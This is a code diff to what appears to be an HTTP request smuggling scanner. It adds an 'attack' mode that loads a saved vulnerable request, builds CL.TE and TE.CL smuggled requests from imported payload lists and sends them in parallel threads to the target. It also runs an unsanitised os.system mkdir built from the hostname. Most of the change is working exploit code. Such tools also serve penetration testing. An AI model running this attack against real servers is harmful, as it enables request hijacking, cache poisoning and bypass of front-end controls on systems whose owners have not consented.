@@ -20,6 +20,8 @@
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
+import concurrent.futures
+import binascii
 import argparse
 import re
 import time
@@ -35,6 +37,7 @@ from datetime import datetime
 from lib.Payload import Payload, Chunked, EndChunk
 from lib.EasySSL import EasySSL
 from lib.colorama import Fore, Style
+from configs.attack import *
 
 class Desyncr():
 	def __init__(self, configfile, smhost, smport=443, url="", method="POST", httpversion="1.1" ,endpoint="/",  SSLFlag=False, logh=None, smargs=None):
@@ -91,7 +94,7 @@ class Desyncr():
 		try:
 			cookies = []
 			web = EasySSL(self.ssl_flag)
-			web.connect(self._host, self._port, 2.0)
+			web.connect(self._host, self._port, 10.0)
 			p = Payload()
 			p.host = self._host
 			p.method = "GET"
@@ -102,7 +105,7 @@ class Desyncr():
 			p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
 			p.header += "Content-Length: 0" + RN
 			p.body = ""
-			#print (str(p))
+#			print (str(p))
 			web.send(str(p).encode())
 			sleep(0.5)
 			res = web.recv_nb(2.0)
@@ -215,12 +218,12 @@ class Desyncr():
 					self._logh.flush()
 
 
-		def write_payload(smhost, payload, ptype):
+		def write_payload(smhost, port ,payload, ptype):
 			furl = smhost.replace('.', '_')
 			if (self.ssl_flag):
-				furl = "https_" + furl
+				furl = "https_" + furl +"_" +str(port)
 			else:
-				furl = "http_" + furl
+				furl = "http_" + furl +"_"+ str(port)
 			if os.path.islink(sys.argv[0]):
 				_me = os.readlink(sys.argv[0])
 			else:
@@ -256,7 +259,7 @@ class Desyncr():
 					pretty_print(name, dismsg)
 					
 					# Write payload out to file
-					write_payload(self._host, clte_res[2], "CLTE"+self._httpversion)
+					write_payload(self._host, self._port ,clte_res[2], "_CLTE"+self._httpversion)
 					self._attempts = 0
 					return True
 
@@ -280,7 +283,7 @@ class Desyncr():
 					pretty_print(name, dismsg)
 					
 					# Write payload out to file
-					write_payload(self._host, tecl_res[2], "TECL"+self._httpversion)
+					write_payload(self._host, self._port , tecl_res[2], "_TECL"+self._httpversion)
 					self._attempts = 0
 					return True
 			else:
@@ -316,6 +319,147 @@ class Desyncr():
 			
 		self._attempts = 0
 		return False
+
+	def make_poc(self,payload):
+		try :
+			web = EasySSL(self.ssl_flag)
+			web.connect(self._host, self._port, self._timeout)
+			web.send(str(payload).encode().replace(b'\xc2\x80',b'\x80').replace(b'\xc2\x81',b'\x81').replace(b'\xc2\x82',b'\x82').replace(b'\xc2\x83',b'\x83').replace(b'\xc2\x84',b'\x84').replace(b'\xc2\x85',b'\x85').replace(b'\xc2\x86',b'\x86').replace(b'\xc2\x87',b'\x87').replace(b'\xc2\x88',b'\x88').replace(b'\xc2\x89',b'\x89').replace(b'\xc2\x8a',b'\x8a').replace(b'\xc2\x8b',b'\x8b').replace(b'\xc2\x8c',b'\x8c').replace(b'\xc2\x8d',b'\x8d').replace(b'\xc2\x8e',b'\x8e').replace(b'\xc2\x8f',b'\x8f').replace(b'\xc2\x90',b'\x90').replace(b'\xc2\x91',b'\x91').replace(b'\xc2\x92',b'\x92').replace(b'\xc2\x93',b'\x93').replace(b'\xc2\x94',b'\x94').replace(b'\xc2\x95',b'\x95').replace(b'\xc2\x96',b'\x96').replace(b'\xc2\x97',b'\x97').replace(b'\xc2\x98',b'\x98').replace(b'\xc2\x99',b'\x99').replace(b'\xc2\x9a',b'\x9a').replace(b'\xc2\x9b',b'\x9b').replace(b'\xc2\x9c',b'\x9c').replace(b'\xc2\x9d',b'\x9d').replace(b'\xc2\x9e',b'\x9e').replace(b'\xc2\x9f',b'\x9f').replace(b'\xc2\xa0',b'\xa0').replace(b'\xc2\xa1',b'\xa1').replace(b'\xc2\xa2',b'\xa2').replace(b'\xc2\xa3',b'\xa3').replace(b'\xc2\xa4',b'\xa4').replace(b'\xc2\xa5',b'\xa5').replace(b'\xc2\xa6',b'\xa6').replace(b'\xc2\xa7',b'\xa7').replace(b'\xc2\xa8',b'\xa8').replace(b'\xc2\xa9',b'\xa9').replace(b'\xc2\xaa',b'\xaa').replace(b'\xc2\xab',b'\xab').replace(b'\xc2\xac',b'\xac').replace(b'\xc2\xad',b'\xad').replace(b'\xc2\xae',b'\xae').replace(b'\xc2\xaf',b'\xaf').replace(b'\xc2\xb0',b'\xb0').replace(b'\xc2\xb1',b'\xb1').replace(b'\xc2\xb2',b'\xb2').replace(b'\xc2\xb3',b'\xb3').replace(b'\xc2\xb4',b'\xb4').replace(b'\xc2\xb5',b'\xb5').replace(b'\xc2\xb6',b'\xb6').replace(b'\xc2\xb7',b'\xb7').replace(b'\xc2\xb8',b'\xb8').replace(b'\xc2\xb9',b'\xb9').replace(b'\xc2\xba',b'\xba').replace(b'\xc2\xbb',b'\xbb').replace(b'\xc2\xbc',b'\xbc').replace(b'\xc2\xbd',b'\xbd').replace(b'\xc2\xbe',b'\xbe').replace(b'\xc2\xbf',b'\xbf').replace(b'\xc3\x80',b'\xc0').replace(b'\xc3\x81',b'\xc1').replace(b'\xc3\x82',b'\xc2').replace(b'\xc3\x83',b'\xc3').replace(b'\xc3\x84',b'\xc4').replace(b'\xc3\x85',b'\xc5').replace(b'\xc3\x86',b'\xc6').replace(b'\xc3\x87',b'\xc7').replace(b'\xc3\x88',b'\xc8').replace(b'\xc3\x89',b'\xc9').replace(b'\xc3\x8a',b'\xca').replace(b'\xc3\x8b',b'\xcb').replace(b'\xc3\x8c',b'\xcc').replace(b'\xc3\x8d',b'\xcd').replace(b'\xc3\x8e',b'\xce').replace(b'\xc3\x8f',b'\xcf').replace(b'\xc3\x90',b'\xd0').replace(b'\xc3\x91',b'\xd1').replace(b'\xc3\x92',b'\xd2').replace(b'\xc3\x93',b'\xd3').replace(b'\xc3\x94',b'\xd4').replace(b'\xc3\x95',b'\xd5').replace(b'\xc3\x96',b'\xd6').replace(b'\xc3\x97',b'\xd7').replace(b'\xc3\x98',b'\xd8').replace(b'\xc3\x99',b'\xd9').replace(b'\xc3\x9a',b'\xda').replace(b'\xc3\x9b',b'\xdb').replace(b'\xc3\x9c',b'\xdc').replace(b'\xc3\x9d',b'\xdd').replace(b'\xc3\x9e',b'\xde').replace(b'\xc3\x9f',b'\xdf').replace(b'\xc3\xa0',b'\xe0').replace(b'\xc3\xa1',b'\xe1').replace(b'\xc3\xa2',b'\xe2').replace(b'\xc3\xa3',b'\xe3').replace(b'\xc3\xa4',b'\xe4').replace(b'\xc3\xa5',b'\xe5').replace(b'\xc3\xa6',b'\xe6').replace(b'\xc3\xa7',b'\xe7').replace(b'\xc3\xa8',b'\xe8').replace(b'\xc3\xa9',b'\xe9').replace(b'\xc3\xaa',b'\xea').replace(b'\xc3\xab',b'\xeb').replace(b'\xc3\xac',b'\xec').replace(b'\xc3\xad',b'\xed').replace(b'\xc3\xae',b'\xee').replace(b'\xc3\xaf',b'\xef').replace(b'\xc3\xb0',b'\xf0').replace(b'\xc3\xb1',b'\xf1').replace(b'\xc3\xb2',b'\xf2').replace(b'\xc3\xb3',b'\xf3').replace(b'\xc3\xb4',b'\xf4').replace(b'\xc3\xb5',b'\xf5').replace(b'\xc3\xb6',b'\xf6').replace(b'\xc3\xb7',b'\xf7').replace(b'\xc3\xb8',b'\xf8').replace(b'\xc3\xb9',b'\xf9').replace(b'\xc3\xba',b'\xfa').replace(b'\xc3\xbb',b'\xfb').replace(b'\xc3\xbc',b'\xfc').replace(b'\xc3\xbd',b'\xfd').replace(b'\xc3\xbe',b'\xfe').replace(b'\xc3\xbf',b'\xff'))
+			sleep(0.5)
+			res = web.recv_nb(self._timeout)
+			web.close()
+			smuggled=1
+			if "Content-Length: 11" in str(payload) or "Content-Length: 5" in str(payload):
+				smuggled=0
+			if res is not None :
+				print(str(payload),str(smuggled),res,"SIZE:"+str(len(res))+"\r\n\r\n")
+#				output_file="/var/www/html/"+self._host+"_"+str(self._port)+"/"+self._host+str(random.random())+".html"
+#				with open(output_file,'wb') as file:
+#					write.file(res)
+				
+
+		except Exception as exception_data:
+			print(exception_data)
+			exit(1)
+
+	def parse_fname(self,file):
+		if "__CLTE" in file:
+			breaker="__CLTE"
+		else:
+			breaker="__TECL"
+		target=file.split(breaker)
+		self._httpversion=target[1][0:3]
+		values=target[0].split("_")
+#		print(values)
+		if values[0]=="https":
+			self.ssl_flag=True
+		else:
+			self.ssl_flag=False
+		self._port=int(values[-1])
+		self._host='.'.join(values[1:-1])
+#		print(self.ssl_flag,self._port,self._host,self._httpversion)
+		return True
+
+	def attack(self,file):
+		RN="\r\n"
+		if not os.path.exists(file):
+			pretty_print("File "+file+" doesnt exist.")
+			exit(1)
+		else:
+			with open(file,'rb') as f:
+				payload_obj=f.read().decode("utf-8")
+				print(payload_obj)
+		p=Payload()
+		p.host = self._host
+#		print(payload_obj)
+		attack_list=[]
+		target=file.split('/')[-1]
+		self.parse_fname(target)
+		p.method="POST"
+		p.endpoint=self._endpoint
+		code,resp,payl=self._test(str(payload_obj))
+		if code == 1:
+			print("Vulnerable")
+		else:
+			print("Not vulnerable")
+			exit(1)
+
+		if "__CLTE" in file:
+			p.header=payload_obj[:-13].replace("Content-Length: 4","Content-Length: 11")
+			p.body=Chunked('X')+EndChunk
+#			p.header.replace("Content-Length: 4","Content-length: 0")
+			for n in range(1,3):
+				attack_list.append(p)
+
+			for pld in Payloads_CLTE:
+				if "__DIR__" in pld:
+					for dir in smuggle_dir:
+						malicious=deepcopy(p)
+#						print(binascii.hexlify(str(p).encode()))
+
+
+
+						malicious.body += pld.replace("__DIR__",dir).replace("__HTTP_VERSION__",self._httpversion).replace("__HOST__",self._host)
+						malicious.header=str(p.header).replace("Content-Length: 11","Content-Length: "+str(len(malicious.body)))
+#						print(str(malicious))
+
+						attack_list.append(malicious)
+						for n in range(1,3):
+							attack_list.append(p)
+				else:
+					malicious=deepcopy(p)
+					malicious.body += pld.replace("__HTTP_VERSION__",self._httpversion).replace("__HOST__",self._host)
+					malicious.header=str(p.header).replace("Content-Length: 11","Content-Length: "+str(len(malicious.body)))
+					attack_list.append(malicious)
+#					print(str(malicious))
+					for n in range(1,3):
+						attack_list.append(p)
+
+		else:
+			p.header=payload_obj[:-8].replace("Content-Length: 6","Content-Length: 5")
+			p.body=EndChunk
+#			print(str(p))
+			for n in range(1,3):
+				attack_list.append(p)
+			for pld in Payloads_TECL:
+
+				if "__DIR__" in pld:
+					for dir in smuggle_dir:
+						malicious=deepcopy(p)
+						malicious.body = Chunked(pld.replace("__DIR__",dir).replace("__HTTP_VERSION__",self._httpversion).replace("__HOST__",self._host))+EndChunk
+						malicious.header=str(p.header).replace("Content-Length: 5","Content-Length: 4")
+#						print(str(malicious))
+						attack_list.append(malicious)
+						for n in range(1,3):
+							attack_list.append(p)
+				else:
+					malicious=deepcopy(p)
+					malicious.body = Chunked(pld.replace("__HTTP_VERSION__",self._httpversion).replace("__HOST__",self._host))+EndChunk
+					malicious.header=str(p.header).replace("Content-Length: 5","Content-Length: 4")
+					attack_list.append(malicious)
+#					print(str(malicious))
+					for n in range(1,3):
+						attack_list.append(p)
+
+		for n in range(1,10):
+			attack_list.append(p)
+#			print(binascii.hexlify(str(p)))
+		os.system("mkdir /var/www/html/"+self._host+"_"+str(self._port))
+		with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+			future_to_smuggle={executor.submit(self.make_poc, req): req for req in attack_list}
+#			print(future_to_smuggle)
+			for future in concurrent.futures.as_completed(future_to_smuggle):
+				smuggle=future_to_smuggle[future]
+				try:
+					data = future.result()
+				except Exception as exc:
+					print(exc)
+				else:
+					continue
+
+
+
+
 
 def process_uri(uri):
 	#remove shouldering white spaces and go lowercase
@@ -392,6 +536,8 @@ if __name__ == "__main__":
 	Parser.add_argument('--no-color', action='store_true', help="Suppress color codes")
 	Parser.add_argument('-c', '--configfile', default="default.py", help="Filepath to the configuration file of payloads")
 	Parser.add_argument('-p','--httpversion', default="1.1", help="Version http to request")
+	Parser.add_argument('-a','--attack', action='store_true', help='Attack Test')
+	Parser.add_argument('-f','--file',default='',help='File with vulnerable request')
 	Args = Parser.parse_args()  # returns data from the options specified (echo)
 
 	NOCOLOR = Args.no_color
@@ -455,7 +601,10 @@ if __name__ == "__main__":
 		print_info("Timeout    : %s"%(Fore.CYAN + str(float(Args.timeout)) + Fore.MAGENTA + " seconds"), FileHandle)
 
 		sm = Desyncr(configfile, host, port, url=server[0], method=method, httpversion=httpversion ,endpoint=endpoint, SSLFlag=SSLFlagval, logh=FileHandle, smargs=Args)
-		sm.run()
+		if Args.attack:
+			sm.attack(Args.file)
+		else:
+			sm.run()
 
 
 	if FileHandle is not None:
